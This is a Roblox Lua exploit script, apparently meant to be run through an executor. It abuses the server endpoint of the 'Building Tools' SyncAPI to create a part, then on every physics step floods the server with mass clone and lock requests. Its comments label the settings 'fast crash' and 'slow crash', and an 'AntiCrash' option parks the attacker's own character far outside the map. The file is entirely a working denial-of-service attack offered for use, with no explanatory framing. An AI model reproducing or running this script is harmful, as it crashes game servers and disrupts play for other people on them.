if not game.Workspace:FindFirstChild("Part") then
local args = {
    [1] = "CreatePart",
    [2] = "Normal",
    [3] = CFrame.new(-93.30662536621094, 1.2067153453826904, -82.3551025390625) * CFrame.Angles(-0, 0, -0),
    [4] = workspace
}

game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
end
if game.Workspace:FindFirstChild("Part") then
--//settings
getgenv().AntiCrash = false


if getgenv().AntiCrash == true then
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2603.48633, 2.96999911e+11, 1420.95654, 0.96061039, 8.98172914e-08, -0.27789861, -7.14185759e-08, 1, 7.63295205e-08, 0.27789861, -5.34758087e-08, 0.96061039)
wait(1)
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
end

game:GetService("RunService").Stepped:Connect(function()
    for a = 1, 300 do --(fast crash)
    --for a = 1, 1 do --(slow crash)
        local b = {
            [1] = "Clone",
            [2] = {
                [1] = workspace.Part,
                [2] = workspace.Part,
                [3] = workspace.Part,
                [4] = workspace.Part,
                [5] = workspace.Part,
                [6] = workspace.Part,
                [7] = workspace.Part,
                [8] = workspace.Part,
                [9] = workspace.Part,
                [10] = workspace.Part,
                [11] = workspace.Part,
                [12] = workspace.Part,
                [13] = workspace.Part,
                [14] = workspace.Part,
                [15] = workspace.Part,
                [16] = workspace.Part,
                [17] = workspace.Part,
                [18] = workspace.Part,
                [19] = workspace.Part,
                [20] = workspace.Part,
                [21] = workspace.Part,
                [22] = workspace.Part,
                [23] = workspace.Part,
                [24] = workspace.Part,
                [25] = workspace.Part,
                [26] = workspace.Part,
                [27] = workspace.Part,
                [28] = workspace.Part,
                [28] = workspace.Part,
                [29] = workspace.Part,
                [30] = workspace.Part,
                [31] = workspace.Part,
                [32] = workspace.Part,
                [33] = workspace.Part,
                [34] = workspace.Part,
                [35] = workspace.Part,
                [36] = workspace.Part,
                [37] = workspace.Part,
                [38] = workspace.Part,
                [39] = workspace.Part,
                [40] = workspace.Part,
                [41] = workspace.Part,
                [42] = workspace.Part,
                [43] = workspace.Part,
                [44] = workspace.Part,
                [45] = workspace.Part,
                
            },
            [3] = workspace
        }
        if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools") then 
            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(
            unpack(b)
        )
        local c = {[1] = "SetLocked", [2] = {[1] = workspace.Part}, [3] = true}
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Building Tools").SyncAPI.ServerEndpoint:InvokeServer(
            unpack(c)
        )
    end
end
wait()
end)
end